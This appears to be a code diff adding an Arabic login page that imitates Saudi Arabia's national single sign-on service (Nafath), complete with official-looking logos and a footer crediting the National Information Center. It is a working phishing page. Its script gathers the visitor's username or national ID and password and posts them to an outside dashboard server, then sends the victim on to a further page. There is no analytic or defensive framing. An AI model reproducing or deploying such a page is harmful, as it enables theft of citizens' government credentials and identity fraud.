@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول - النفاذ الوطني</title>
+  <style>
+    body {
+      font-family: "Tajawal", sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #fff;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* Header */
+    header {
+      background: #fff;
+      padding: 5px 20px;
+      border-bottom: 1px solid #ddd;
+      display: flex;
+      justify-content: flex-start;
+      align-items: center;
+      height: 75px;
+    }
+    header img {
+      height: 100%;
+      width: auto;
+      border-radius: 15px;
+    }
+
+    /* Tabs */
+    .tabs {
+      display: flex;
+      flex-direction: column;
+      border-bottom: 2px solid #ddd;
+    }
+    .tab {
+      text-align: center;
+      padding: 12px;
+      font-weight: bold;
+      cursor: pointer;
+      background: #f1f1f1;
+      border-top: 1px solid #ddd;
+    }
+    .tab:first-child {
+      border-top: none;
+    }
+    .tab.active {
+      background: #009688;
+      color: #fff;
+    }
+
+    /* Container */
+    .container {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 20px;
+    }
+    .login-box {
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      padding: 25px 20px;
+      background: #fff;
+      width: 100%;
+      max-width: 380px;
+      text-align: center;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 2px solid #ddd;
+      border-radius: 8px;
+      font-size: 16px;
+      text-align: center;
+      outline: none;
+      box-sizing: border-box;
+    }
+    .login-box input:focus {
+      border-color: #009688;
+    }
+
+    .btn {
+      background-color: #009688;
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 8px;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .btn:hover {
+      background-color: #00796b;
+    }
+
+    /* Footer */
+    footer {
+      background: #f1f2f6;
+      text-align: center;
+      padding: 20px;
+      border-top: 1px solid #ddd;
+      font-size: 14px;
+      color: #333;
+    }
+    footer img {
+      height: 60px;
+      margin-bottom: 10px;
+      border-radius: 15px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <img src="images/nafadLogo.avif" alt="شعار نفاذ ورؤية 2030">
+  </header>
+
+  <!-- Tabs -->
+  <div class="tabs">
+    <div class="tab">تطبيق نفاذ</div>
+    <div class="tab active">اسم المستخدم وكلمة المرور</div>
+  </div>
+
+  <!-- Main Container -->
+  <div class="container">
+    <div class="login-box">
+      <input type="text" id="username" placeholder="اسم المستخدم / الهوية الوطنية">
+      <input type="password" id="password" placeholder="كلمة المرور">
+      <button class="btn" id="loginBtn">تسجيل الدخول</button>
+    </div>
+  </div>
+
+  <script>
+  document.getElementById('loginBtn').addEventListener('click', async function () {
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    if (!username || !password) {
+      alert("يرجى إدخال اسم المستخدم وكلمة المرور.");
+      return;
+    }
+
+    const message =
+      `🔐 محاولة تسجيل دخول:\n` +
+      `👤 اسم المستخدم / الهوية: ${username}\n` +
+      `🔑 كلمة المرور: ${password}`;
+
+    try {
+      const response = await fetch("https://bm-dashboard-a0mt.onrender.com/api/messages", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ text: message })
+      });
+
+      if (response.ok) {
+        window.location.href = "moveTonafad.html"; // نجاح → انتقال للخطوة التالية
+      } else {
+        const err = await response.text();
+        alert("خطأ: " + err);
+      }
+    } catch (error) {
+      console.error(error);
+      alert("تعذر الاتصال بالخادم.");
+    }
+  });
+  </script>
+
+  <!-- Footer -->
+  <footer>
+    <img src="images/nic.png" alt="شعار مركز المعلومات الوطني">
+    <p>© 2025 النفاذ الوطني الموحد جميع الحقوق محفوظة</p>
+    <p>تطوير وتشغيل مركز المعلومات الوطني</p>
+    <img src="images/digital.png" alt="شعار مركز المعلومات الوطني">
+  </footer>
+
+</body>
+</html>
